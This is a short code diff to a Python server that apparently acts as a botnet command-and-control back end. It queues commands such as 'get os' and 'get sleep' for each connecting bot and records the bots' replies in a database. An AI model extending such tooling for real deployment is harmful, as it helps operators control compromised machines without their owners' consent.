@@ -35,9 +35,12 @@ def handle_client(sock, addr):
         b = Bot(ip=addr[0])
     if not addr[0] in queue.keys():
         queue.update({addr[0]:list()})
+        b.sleep_interval = None
     b.last_seen_time = datetime.now()
     if b.os == None:
         queue[addr[0]].append("get os")
+    if b.sleep_interval == None:
+        queue[addr[0]].append("get sleep")
     db.session.add(b)
     db.session.commit()
     inp = select([sock], [], [], 1)
@@ -50,5 +53,9 @@ def handle_client(sock, addr):
 def action(data, bot):
     if data.startswith("set os:"):
         bot.os = data.split(":")[1]
-        db.session.add(bot)
-        db.session.commit()
+    elif data.startswith("set sleep:"):
+        bot.sleep_interval = int(data.split(":")[1])
+    else:
+        bot.last_response = data
+    db.session.add(bot)
+    db.session.commit()
